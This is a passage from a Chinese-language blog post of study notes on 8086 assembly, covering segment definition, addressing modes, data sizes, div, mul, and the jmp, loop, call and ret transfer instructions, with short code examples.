ax, <span class="number">4</span>c00h</span><br><span class="line">      <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>下面对以上代码进行说明。</p>
<p>（1）定义多个段的方法  </p>
<p>定义数据段、栈段与定义代码段的方法没有区别，只是对于不同的段，要有不同的段名。</p>
<p>（2）对段地址的引用</p>
<p>在程序中，段名就相当于一个标号，它代表了段地址。例如程序中“data”段中的数据“0abch”的地址就是：data:6。要将它送入bx中，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line">mov bx, ds:[<span class="number">6</span>]</span><br></pre></td></tr></table></figure></div>
<p>（3）“代码段”、“数据段”、“栈段”完全是我们的安排</p>
<p>我们通过“end 标号”的形式来声明程序的入口地址，这个入口信息被写入可执行文件中的描述信息中。可执行文件中的程序被加载入内存后，CPU的CS:IP就会被设置指向这个入口。</p>
<p>我们通过如下代码来指定程序的栈段：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, <span class="built_in">stack</span></span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, <span class="number">20</span>h</span><br></pre></td></tr></table></figure></div>
<p>通过如下代码来指定数据段：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br></pre></td></tr></table></figure></div>
<p>总而言之，CPU到底如何处理我们定义的段中的内容，是当作指令执行，当作数据访问，还是当作栈空间，完全靠程序中具体的汇编指令，和汇编指令对CS:IP、SS:SP、DS等寄存器的设置来决定的。</p>
<hr>
<h2 id="第七章-更灵活的定位内存地址的方法"><a href="#第七章-更灵活的定位内存地址的方法" class="headerlink" title="第七章 更灵活的定位内存地址的方法"></a><strong>第七章 更灵活的定位内存地址的方法</strong></h2><p>本章主要讲不同的寻址方式。</p>
<h3 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a><strong>7.1 and和or指令</strong></h3><p>and表示逻辑与。or表示逻辑或。</p>
<h3 id="7-2-关于ASCII码"><a href="#7-2-关于ASCII码" class="headerlink" title="7.2 关于ASCII码"></a><strong>7.2 关于ASCII码</strong></h3><p>ASCII码：American Standard Code for Information Interchange，美国信息交换标准代码。用8位（一个字节）二进制数表示一个字符。起初定义了128个字符，后来扩展至256个。</p>
<p>当我们再键盘上按下字母a键，屏幕上显示a字母，这其中经历了哪些过程？</p>
<ol>
<li>a被ASCII编码为数字61H存储在指定内存空间内。</li>
<li>文本编辑器软件从内存中取出61H,将其送入显卡显存中。</li>
<li>显卡根据ASCII编码将61H反译为字母a，同时显卡驱动显示器，将字母a的图像画在屏幕上。</li>
</ol>
<p>通过以上3步，我们就看到了字母a被显示在屏幕上。</p>
<h3 id="7-3-以字符形式给出的数据"><a href="#7-3-以字符形式给出的数据" class="headerlink" title="7.3 以字符形式给出的数据"></a><strong>7.3 以字符形式给出的数据</strong></h3><p>在汇编程序中，使用引号‘’括起来的内容被识别为字符，编译器将把它转换为对应的ASCII码。</p>
<h3 id="7-4-大小写转换的问题"><a href="#7-4-大小写转换的问题" class="headerlink" title="7.4 大小写转换的问题"></a><strong>7.4 大小写转换的问题</strong></h3><p>在ASCII码中，小写字母的对应范围为：61H - 7AH。大写字母的对应范围为：41H - 5AH。可见同一个字母的大写形式的ASCII码比小写形式的ASCII码小20H。</p>
<p>仔细观察大小写字母所对应的ASCII吗二进制形式，可以发现如下规律：大写字母从右数第6位（从1开始计算）全为0，小写字母从右数第6位全为1。</p>
<p>综上我们可以总结出大小写转换的两种方式：</p>
<p><strong>字母大小写转换方式1：</strong></p>
<ol>
<li>大写字母加上20h可转换为小写字母。</li>
<li>小写字母减去20h可转换为大写字母。</li>
</ol>
<p><strong>字母大小写转换方式2：</strong></p>
<ol>
<li>字母转大写：逻辑与11011111B。</li>
<li>字母转小写：逻辑或00100000B。</li>
</ol>
<h3 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a><strong>7.5 [bx+idata]</strong></h3><p>这是一种”变量+常量”的寻址方式。</p>
<p>[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata。<br>指令:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, [bx+<span class="number">200</span>]</span><br></pre></td></tr></table></figure></div>
<p>表示将一个内存单元的内容送入ax，这个内存单元的长度为2个字节（字单元），存放一个字，偏移地址为bx中的数值加上200，段地址在ds中。</p>
<p>该指令的常用格式有：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, [bx+<span class="number">200</span>]</span><br><span class="line">mov ax, <span class="number">200</span>[bx]</span><br><span class="line">mov ax, [bx]<span class="number">.200</span></span><br></pre></td></tr></table></figure></div>

<h3 id="7-6-用-bx-idata-的方式进行数组的处理"><a href="#7-6-用-bx-idata-的方式进行数组的处理" class="headerlink" title="7.6 用[bx+idata]的方式进行数组的处理"></a><strong>7.6 用[bx+idata]的方式进行数组的处理</strong></h3><p>我们可以将地址连续的多个数据当做数组处理。例如定义如下数据：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">datasg segment</span><br><span class="line">  db <span class="string">&#x27;BaSiC&#x27;</span></span><br><span class="line">  db <span class="string">&#x27;MinIX&#x27;</span></span><br><span class="line">datasg ends</span><br></pre></td></tr></table></figure></div>
<p>我们可以把如上两个字符串当做两个数组，一个数组下标从0开始，一个数组下标从5开始。在程序中使用[bx+0]和[bx+5]的方式定位两个字符串的首地址。从而可以在一个循环当中同时处理两组数据。</p>
<p>回忆我们在高级语言中用到的数组取值方式(如c或java)：a[index]。可以看出这就是汇编语言中[bx+idata]形式的变种。a与idata相对应，是一常量，表示了数组的首地址。而下标index与bx对应，是一变量，表示数组下标。</p>
<h3 id="7-7-SI和DI"><a href="#7-7-SI和DI" class="headerlink" title="7.7 SI和DI"></a><strong>7.7 SI和DI</strong></h3><p>SI是Source Index的缩写。DI是Destination Index的缩写。它俩的功能与bx相近，但SI和DI不能够分成两个8位寄存器来使用。下面三组指令实现了相同的功能：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">;(<span class="number">1</span>)</span><br><span class="line">mov bx, <span class="number">0</span></span><br><span class="line">mov ax, [bx]</span><br><span class="line"></span><br><span class="line">;(<span class="number">2</span>)</span><br><span class="line">mov si, <span class="number">0</span></span><br><span class="line">mov ax, [si]</span><br><span class="line"></span><br><span class="line">;(<span class="number">3</span>)</span><br><span class="line">mov di, <span class="number">0</span></span><br><span class="line">mov ax, [di]</span><br></pre></td></tr></table></figure></div>
<p>下面的三组指令也实现了相同的功能：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">;(<span class="number">1</span>)</span><br><span class="line">mov bx, <span class="number">0</span></span><br><span class="line">mov ax, [bx+<span class="number">123</span>]</span><br><span class="line"></span><br><span class="line">;(<span class="number">2</span>)</span><br><span class="line">mov si, <span class="number">0</span></span><br><span class="line">mov ax, [si+<span class="number">123</span>]</span><br><span class="line"></span><br><span class="line">;(<span class="number">3</span>)</span><br><span class="line">mov di, <span class="number">0</span></span><br><span class="line">mov ax, [di+<span class="number">123</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="7-8-bx-si-和-bx-di"><a href="#7-8-bx-si-和-bx-di" class="headerlink" title="7.8 [bx+si]和[bx+di]"></a><strong>7.8 [bx+si]和[bx+di]</strong></h3><p>这是一种“变量+变量”的寻址方式。</p>
<p>[bx+si]和[bx+di]含义相似，都是表示一个内存单元。该内存单元的段地址位于ds中，偏移地址为bx的值加上si的值（或bx的值加上di的值）。</p>
<p>该指令的常用格式有：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, [bx+si]</span><br><span class="line">mov ax, [bx][si]</span><br></pre></td></tr></table></figure></div>

<h3 id="7-9-bx-si-idata-和-bx-di-idata"><a href="#7-9-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.9 [bx+si+idata]和[bx+di+idata]"></a><strong>7.9 [bx+si+idata]和[bx+di+idata]</strong></h3><p>这是一种”变量+变量+常量”的寻址方式。</p>
<p>常用指令格式：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, [bx+<span class="number">200</span>+si]</span><br><span class="line">mov ax, [<span class="number">200</span>+bx+si]</span><br><span class="line">mov ax, <span class="number">200</span>[bx][si]</span><br><span class="line">mov ax, [bx]<span class="number">.200</span>[si]</span><br><span class="line">mov ax, [bx][si]<span class="number">.200</span></span><br></pre></td></tr></table></figure></div>
<h3 id="7-10-不同的寻址方式的灵活应用"><a href="#7-10-不同的寻址方式的灵活应用" class="headerlink" title="7.10 不同的寻址方式的灵活应用"></a><strong>7.10 不同的寻址方式的灵活应用</strong></h3><p>总结一下前面讲到的几种定位内存地址的方法（寻址方式）：</p>
<p>（1）[idata]用一个常量来表示地址，可用于直接定位一个内存单元；<br>（2）[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元；<br>（3）[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元；<br>（4）[bx+si]用两个变量表示地址；<br>（5）[bx+si+idata]用两个变量和一个常量表示地址。</p>
<p>下一章中，我们将对寻址方式的问题进行更深入的探讨，之所以如此重视这个问题，是因为寻址方式的适当应用，使我们可以以更合理的结构来看待所要处理的数据。而<strong>为所要处理的看似杂乱的数据设计一种清晰的数据结构是程序设计的一个关键问题</strong>（个人认为这段话说的很有道理，特记录于此）</p>
<hr>
<h2 id="第八章-数据处理的两个基本问题"><a href="#第八章-数据处理的两个基本问题" class="headerlink" title="第八章 数据处理的两个基本问题"></a><strong>第八章 数据处理的两个基本问题</strong></h2><p>本章旨在进一步加强对不同寻址方式的理解及运用。</p>
<p>计算机是进行数据处理、运算的机器，这其中包含两个基本的问题：  </p>
<p>（1）处理的数据在什么地方？<br>（2）要处理的数据有多长？</p>
<p>携带着这两个问题，我们开启第八章的学习之路。</p>
<h3 id="8-1-bx、si、di和bp"><a href="#8-1-bx、si、di和bp" class="headerlink" title="8.1 bx、si、di和bp"></a><strong>8.1 bx、si、di和bp</strong></h3><p>首先看下这四个寄存器的含义：</p>
<p>bx, Base,Pointer to base addresss (data)。一般用于存储数据段的基址（首地址）。<br>si，Source Index，Source string&#x2F;index pointer。一般用于存储源数组数据索引（下标）。<br>di，Destination Index，estination string&#x2F;index pointer。一般用于存储目标数组数据索引（下标）。<br>bp，Base Pointer，Pointer to base address (stack)。一般用于存储栈的基址。</p>
<p>然后在使用过程中有几处需要注意的地方：</p>
<p>（1）在8086CPU中，只有这4个寄存器可以用在“[….]”中来进行内存单元的寻址。其他寄存器是不可以的，例如“mov bx, [ax]”就是错误的用法。</p>
<p>（2）在[…]中，这四个寄存器可以单个出现，或只能以4种组合出现：bx和si、bx和di、bp和si、bp和di。为了方便记忆可以将si和di看做一组，将bx和bp看做一组。组间可以自由组合，组内不能组合。（脑补为人类不可以近亲繁殖。）</p>
<p>（3）只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，则段地址就默认在ss中。</p>
<h3 id="8-2-机器指令处理的数据在什么地方"><a href="#8-2-机器指令处理的数据在什么地方" class="headerlink" title="8.2 机器指令处理的数据在什么地方"></a><strong>8.2 机器指令处理的数据在什么地方</strong></h3><p>这是我们在开头抛出的两个问题中的第一个。</p>
<p>在指令执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口（端口暂时不用知道是什么东西）。</p>
<p>我们知道了存储数据的部件，但如果具体找到这些部件存储的数据位置？下一节将解答我们的疑问。</p>
<h3 id="8-3-汇编语言中数据位置的表达"><a href="#8-3-汇编语言中数据位置的表达" class="headerlink" title="8.3 汇编语言中数据位置的表达"></a><strong>8.3 汇编语言中数据位置的表达</strong></h3><p>在汇编语言中如何表达数据的位置？  </p>
<p>汇编语言中用3个概念来表达数据的位置。</p>
<p>（1）立即数</p>
<p>对于直接包含在机器指令中的数据（执行前在CPU的指令缓冲器中），汇编语言中称为立即数（idata）,在汇编指令中直接给出。<br>例如：  </p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, <span class="number">1</span></span><br><span class="line">or bx, <span class="number">00100000B</span></span><br></pre></td></tr></table></figure></div>

<p>（2）寄存器</p>
<p>指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名。例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, bx</span><br><span class="line">push bx</span><br></pre></td></tr></table></figure></div>

<p>（3）段地址（SA）和偏移地址（EA）</p>
<p>指令要处理的数据在内存中，在汇编语言中可以用[X]的格式给出EA，SA在某个段寄存器中。</p>
<p>存放段地址的寄存器可以是默认的，也可以显性给出。例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">;段寄存器默认存储在DS中</span><br><span class="line"> mov  ax, [<span class="number">0</span>]</span><br><span class="line"> mov ax, [bx]</span><br><span class="line"> mov ax, [di]</span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> ;段寄存器默认存储在SS中</span><br><span class="line"> mov ax, [bp]</span><br><span class="line"> mov ax, [bp+si]</span><br><span class="line"> mov ax, [bp+di]</span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> ;段寄存器显性给出</span><br><span class="line"> mov ax, ds:[bp]</span><br><span class="line"> mov ax, es:[<span class="number">3</span>]</span><br><span class="line"> mov ax, ss:[bx+si]</span><br><span class="line"> mov ax, cs:[bx+si+<span class="number">8</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="8-4-寻址方式"><a href="#8-4-寻址方式" class="headerlink" title="8.4 寻址方式"></a><strong>8.4 寻址方式</strong></h3><p>这一节我们总结一下所学到过的寻址方式。列表如下：</p>
<p>|寻址方式| 含义 | 名称 | 常用格式举例|备注|<br>|——–|—-|—|—|<br>|[idata]|EA&#x3D;idata; SA&#x3D;(ds)| 直接寻址|[idata]|偏移地址&#x3D;立即数|<br>|[bx]  |EA&#x3D;(bx); SA&#x3D;(ds)| 寄存器间接寻址|[bx]|偏移地址&#x3D;变量|<br>|[bx+idata]| EA&#x3D;(bx)+idata; SA&#x3D;(ds)|寄存器相对寻址| 用于结构体：[bx].idata; 用于数组：idata[si],idata[di]; 用于二维数组：[bx][idata]   |偏移地址&#x3D;变量+立即数|<br>|[bx+si]|EA&#x3D;(bx)+(si); SA&#x3D;(ds)|基址变址寻址|用于二维数组：[bx][si]|偏移地址&#x3D;变量+变量|<br>|[bx+si+idata]|EA&#x3D;(bx)+(si)+idata; SA&#x3D;(ds)|相对基址变址寻址| 用于表格（结构）中的数组项：[bx].idata[si]; 用于二维数组idata[bx][si]|偏移地址&#x3D;变量+变量+立即数|</p>
<p>注意在8.1节指出的特殊情况，只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中。</p>
<h3 id="8-5-指令要处理的数据有多长"><a href="#8-5-指令要处理的数据有多长" class="headerlink" title="8.5 指令要处理的数据有多长"></a><strong>8.5 指令要处理的数据有多长</strong></h3><p>这是我们在开头抛出的两个问题中的第二个。</p>
<p>8086CPU的指令，可以处理两种尺寸的数据，byte和word。所以在机器指令中要指明，指令进行的是字操作还是字节操作。对于这个问题，汇编语言中用以下方法处理。</p>
<p>（1）通过寄存器名指定要处理的数据的尺寸。如果寄存器名是字型寄存器（如ax、bx等），则说明指令进行的是字操作。如果寄存器名是字节型寄存器（如al、ah、bl等），则说明指令进行的是字节操作。</p>
<p>（2）在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte。这种情形适用于没有寄存器参与的内存单元访问指令中。例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">;下面的指令，用word ptr指明了指令中访问的内存单元是一个字单元</span><br><span class="line">mov word ptr ds:[<span class="number">0</span>], <span class="number">1</span></span><br><span class="line">inc word ptr [bx]</span><br><span class="line"></span><br><span class="line">;下面的指令，用byte ptr指明了指令访问的内存单元是一个字节单元</span><br><span class="line">mov byte ptr ds:[<span class="number">0</span>], <span class="number">1</span></span><br><span class="line">inc byte ptr [bx]</span><br></pre></td></tr></table></figure></div>

<p>（3）其他方法。有些指令默认了访问的是字单元还是字节单元，比如，push[1000H]就不用指明访问的是字单元还是字节单元，因为push指令只会进行字操作。</p>
<h3 id="8-6-寻址方式的综合应用"><a href="#8-6-寻址方式的综合应用" class="headerlink" title="8.6 寻址方式的综合应用"></a><strong>8.6 寻址方式的综合应用</strong></h3><p>8086CPU提供的如[bx+si+idata]的寻址方式为结构化数据的处理提供了方便。使得我们可以在编程的时候，从结构化的角度去看待所要处理的数据。正常情况下，一个结构化的数据包含了多个数据项，而数据项的类型又不相同，有的是字型数据，有的是字节型数据，有的是数组（字符串）。一般来说，我们可以用[bx+idata+si]的方式来访问结构体中的数据。用bx定位整个结构体，用idata定位结构体中的某一个数据项，用si定位数组项中的元素。为此，汇编语言提供了更为贴切的书写方式，如[bx].idata、[bx].idata[si]。</p>
<h3 id="8-7-div指令"><a href="#8-7-div指令" class="headerlink" title="8.7 div指令"></a><strong>8.7 div指令</strong></h3><p>div是除法指令。在使用的过程中应注意以下问题：</p>
<p>（1）除数：有8位和16位两种，在一个reg(寄存器)或内存单元中。</p>
<p>（2）被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</p>
<p>（3）结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</p>
<p>div使用格式如下：  </p>
<blockquote>
<p>div reg<br>div 内存单元</p>
</blockquote>
<h3 id="8-8-伪指令dd"><a href="#8-8-伪指令dd" class="headerlink" title="8.8 伪指令dd"></a><strong>8.8 伪指令dd</strong></h3><p>dd用来定义dword（双字）型数据。</p>
<h3 id="8-9-dup"><a href="#8-9-dup" class="headerlink" title="8.9 dup"></a><strong>8.9 dup</strong></h3><p>dup(duplication的缩写)用来重复开辟内存空间。</p>
<p>dup指令要和db、dw、dd等数据定义伪指令配合使用，使用格式如下：</p>
<blockquote>
<p>db 重复次数 dup (重复的字节型数据)<br>dw 重复次数 dup (重复的字型数据)<br>dd 重复次数 dup (重复的双字型数据)</p>
</blockquote>
<p>例如，如下代码表示定义了9个字节：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">db <span class="number">3</span> dup (<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="第九章-转移指令的原理"><a href="#第九章-转移指令的原理" class="headerlink" title="第九章 转移指令的原理"></a><strong>第九章 转移指令的原理</strong></h2><p>本章主要讲如何控制CPU执行指令的顺序。</p>
<p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。概括的降，转移指令就是可以控制CPU执行内存中某处代码的指令。</p>
<p>8086CPU的转移指令有以下几类。</p>
<ul>
<li>只修改IP时，称为<strong>段内转移</strong>，比如：jum ax。</li>
<li>同时修改CS和IP时，称为<strong>段间转移</strong>，比如：jmp 1000:0。</li>
</ul>
<p>由于转移指令对IP的修改范围不同，段内转移又分为：短转移和近转移。</p>
<ul>
<li>短转移IP的修改范围为-128~127。</li>
<li>近转移IP的修改范围为-32768~32767。</li>
</ul>
<p>8086CPU的转移指令分为以下几类。</p>
<ul>
<li>无条件转移指令（如jmp）</li>
<li>条件转移指令</li>
<li>循环指令（如loop）</li>
<li>过程</li>
<li>中断</li>
</ul>
<p>这些转移指令的前提条件可能不同，但转移的基本原理是相同的。</p>
<h3 id="9-1-操作符-offset"><a href="#9-1-操作符-offset" class="headerlink" title="9.1 操作符 offset"></a><strong>9.1 操作符 offset</strong></h3><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。</p>
<h3 id="9-2-jmp-指令"><a href="#9-2-jmp-指令" class="headerlink" title="9.2 jmp 指令"></a><strong>9.2 jmp 指令</strong></h3><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP。</p>
<p>jmp指令要给出两种信息：</p>
<p>（1）转移的目的地址<br>（2）转移的距离（段间转移、段内短转移、段内近转移）</p>
<p>下面几节将对jmp指令进行详细的介绍。</p>
<h3 id="9-3-依据位移进行转移的jmp指令"><a href="#9-3-依据位移进行转移的jmp指令" class="headerlink" title="9.3 依据位移进行转移的jmp指令"></a><strong>9.3 依据位移进行转移的jmp指令</strong></h3><blockquote>
<p>jmp short 标号</p>
</blockquote>
<p>实现的是段内短转移，执行后： （IP） &#x3D; （IP）+ 8位位移。  </p>
<p>（1）8位位移&#x3D;标号处的地址-jmp指令后第一个字节的地址；<br>（2）short指明此处的位移为8位位移；<br>（3）8位位移的范围为-128~127，用补码表示；<br>（4）8位位移由编译程序在编译时算出。</p>
<blockquote>
<p>jmp near ptr 标号</p>
</blockquote>
<p>实现的是段内近转移，执行后：（IP） &#x3D; （IP） + 16位位移。</p>
<p>（1）16位位移&#x3D;标号处的地址-jmp指令后第一个字节的地址；<br>（2）near ptr 指明此处的位移为16位位移，进行的是段内近转移；<br>（3）16位位移的范围为-32768~32767，用补码表示；<br>（4）16位位移由编译程序在编译时算出。</p>
<h3 id="9-4-转移的目的地址在指令中的jmp指令"><a href="#9-4-转移的目的地址在指令中的jmp指令" class="headerlink" title="9.4 转移的目的地址在指令中的jmp指令"></a><strong>9.4 转移的目的地址在指令中的jmp指令</strong></h3><blockquote>
<p>jmp far ptr 标号</p>
</blockquote>
<p>实现的是段间转移，又称为远转移。功能如下：<br>（CS）&#x3D;标号所在段的段地址；（IP）&#x3D;标号所在段中的偏移地址。</p>
<p>far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。</p>
<p>该指令与上节学习的段内转移明显不同的是：<br>段内转移机器指令携带的是位移，段间转移机器指令携带的是目的地址。</p>
<h3 id="9-5-转移地址在寄存器中的jmp指令"><a href="#9-5-转移地址在寄存器中的jmp指令" class="headerlink" title="9.5 转移地址在寄存器中的jmp指令"></a><strong>9.5 转移地址在寄存器中的jmp指令</strong></h3><blockquote>
<p>jmp 16位的reg</p>
</blockquote>
<p>该指令实现的功能为：（IP）&#x3D; （16位的reg）</p>
<h3 id="9-6-转移地址在内存中的jmp指令"><a href="#9-6-转移地址在内存中的jmp指令" class="headerlink" title="9.6 转移地址在内存中的jmp指令"></a><strong>9.6 转移地址在内存中的jmp指令</strong></h3><blockquote>
<p>jmp word ptr 内存单元地址（段内转移）</p>
</blockquote>
<p>功能：从内存单元地址处开始存放一个字，是转移的目的偏移地址。</p>
<p>内存单元地址可以用之前学过的任一寻址方式给出。</p>
<blockquote>
<p>jmp dword ptr 内存单元地址（段间转移）</p>
</blockquote>
<p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的的偏移地址。</p>
<h3 id="9-7-jcxz-指令"><a href="#9-7-jcxz-指令" class="headerlink" title="9.7 jcxz 指令"></a><strong>9.7 jcxz 指令</strong></h3><blockquote>
<p>jcxz 标号</p>
</blockquote>
<p>功能：如果（cx）&#x3D;0，则转移到标号处执行。如果（cx）≠ 0，则程序继续向下执行。</p>
<p>jcxz指令为有条件转递指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为：-128~127。</p>
<h3 id="9-8-loop指令"><a href="#9-8-loop指令" class="headerlink" title="9.8 loop指令"></a><strong>9.8 loop指令</strong></h3><blockquote>
<p>loop 标号</p>
</blockquote>
<p>功能：（cx）&#x3D;（cx）-1，如果（cx）≠ 0，则转移到标号处执行。</p>
<h3 id="9-9-根据位移进行转移的意义"><a href="#9-9-根据位移进行转移的意义" class="headerlink" title="9.9 根据位移进行转移的意义"></a><strong>9.9 根据位移进行转移的意义</strong></h3><p>方便了程序段在内存中的浮动装配。</p>
<h3 id="9-10-编译器对转移位移超界的检测"><a href="#9-10-编译器对转移位移超界的检测" class="headerlink" title="9.10 编译器对转移位移超界的检测"></a><strong>9.10 编译器对转移位移超界的检测</strong></h3><p>根据位移进行转移的指令，它们的转移范围受到转移位移的限制，如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错。</p>
<hr>
<h2 id="第十章-CALL和RET指令"><a href="#第十章-CALL和RET指令" class="headerlink" title="第十章 CALL和RET指令"></a><strong>第十章 CALL和RET指令</strong></h2><blockquote>
<p>call和ret都是转移指令，它们都修改IP，或同时修改CS和IP。它们经常被共同用来实现子程序的设计。</p>
</blockquote>
<h3 id="10-1-ret-和-retf"><a href="#10-1-ret-和-retf" class="headerlink" title="10.1 ret 和 retf"></a><strong>10.1 ret 和 retf</strong></h3><p>这个两个指令可以理解为高级语言中的return关键字，表示程序返回。</p>
<p>ret 用栈中的数据，修改IP的内容，从而实现近转移；<br>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p>
<p>CPU执行ret指令时，进行下面两步操作：  </p>
<p>（1）(IP) &#x3D; ((SS)*16+(SP))<br>（2）(sp) &#x3D; (sp)+2  </p>
<p>以上步骤相当于进行：</p>
<blockquote>
<p>pop IP</p>
</blockquote>
<p>CPU执行retf指令时，进行下面4步操作：</p>
<p>（1）(IP) &#x3D; ((SS)*16+(SP))<br>（2）(sp) &#x3D; (sp)+2<br>（3）(CS) &#x3D; ((SS)*16+(SP))<br>（4）(sp) &#x3D; (sp)+2   </p>
<p>以上步骤相当于进行：</p>
<blockquote>
<p>pop IP<br>pop CS</p>
</blockquote>
<h3 id="10-2-call-指令"><a href="#10-2-call-指令" class="headerlink" title="10.2 call 指令"></a><strong>10.2 call 指令</strong></h3><p>call指令可以理解为高级语言中的方法（函数）调用功能。</p>
<p>CPU指令call指令时，进行两步操作：</p>
<p>（1）将当前的IP或CS和IP压入栈中。  （保存现场）<br>（2）转移。</p>
<p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p>
<h3 id="10-3-依据位移进行转移的call指令"><a href="#10-3-依据位移进行转移的call指令" class="headerlink" title="10.3 依据位移进行转移的call指令"></a><strong>10.3 依据位移进行转移的call指令</strong></h3><p>指令格式：</p>
<blockquote>
<p>call 标号</p>
</blockquote>
<p>CPU执行该指令时相当于进行：</p>
<blockquote>
<p>push IP<br>jmp near ptr 标号</p>
</blockquote>
<h3 id="10-4-转移的目的地址在指令中的call指令"><a href="#10-4-转移的目的地址在指令中的call指令" class="headerlink" title="10.4 转移的目的地址在指令中的call指令"></a><strong>10.4 转移的目的地址在指令中的call指令</strong></h3><p>指令格式：</p>
<blockquote>
<p>call far ptr 标号</p>
</blockquote>
<p>CPU执行该指令时相当于进行：</p>
<blockquote>
<p>push CS<br>push IP<br>jmp far ptr 标号</p>
</blockquote>
<p>该指令编译的机器指令中包含了转移的目的地址。包括段地址CS的值及偏移地址IP的值。</p>
<h3 id="10-5-转移地址在寄存器中的call指令"><a href="#10-5-转移地址在寄存器中的call指令" class="headerlink" title="10.5 转移地址在寄存器中的call指令"></a><strong>10.5 转移地址在寄存器中的call指令</strong></h3><p>指令格式：</p>
<blockquote>
<p>call 16位reg</p>
</blockquote>
<p>CPU执行该指令时相当于进行：</p>
<blockquote>
<p>push IP<br>jmp 16位reg</p>
</blockquote>
<h3 id="10-6-转移地址在内存中的call指令"><a href="#10-6-转移地址在内存中的call指令" class="headerlink" title="10.6 转移地址在内存中的call指令"></a><strong>10.6 转移地址在内存中的call指令</strong></h3><p>转移地址在内存中的call指令有两种格式。</p>
<p>（1）第一种指令格式：</p>
<blockquote>
<p>call word ptr 内存单元地址</p>
</blockquote>
<p>CPU执行该指令时相当于进行：</p>
<blockquote>
<p>push IP<br>jmp word ptr 内存单元地址</p>
</blockquote>
<p>（2）第二种指令格式:</p>
<blockquote>
<p>call dword ptr 内存单元地址</p>
</blockquote>
<p>CPU执行该指令时相当于进行：</p>
<blockquote>
<p>push CS<br>push IP<br>jmp dword ptr 内存单元地址</p>
</blockquote>
<h3 id="10-7-call和ret的配合使用"><a href="#10-7-call和ret的配合使用" class="headerlink" title="10.7 call和ret的配合使用"></a><strong>10.7 call和ret的配合使用</strong></h3><p>call和ret的配合使用可以用来实现子程序的机制。call指令在转去执行子程序之前，会将当前指令下一条指令的位置保持在栈中，当子程序执行ret或retf指令后，会用栈中的数据设置ip或cs和ip的值，从而转到call指令后面的代码处继续执行。</p>
<h3 id="10-8-mul指令"><a href="#10-8-mul指令" class="headerlink" title="10.8 mul指令"></a><strong>10.8 mul指令</strong></h3><p>（1）两个相乘的数：练歌相乘的数，要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字单元中。</p>
<p>（2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放。</p>
<h3 id="10-9-模块化程序设计"><a href="#10-9-模块化程序设计" class="headerlink" title="10.9 模块化程序设计"></a><strong>10.9 模块化程序设计</strong></h3><blockquote>
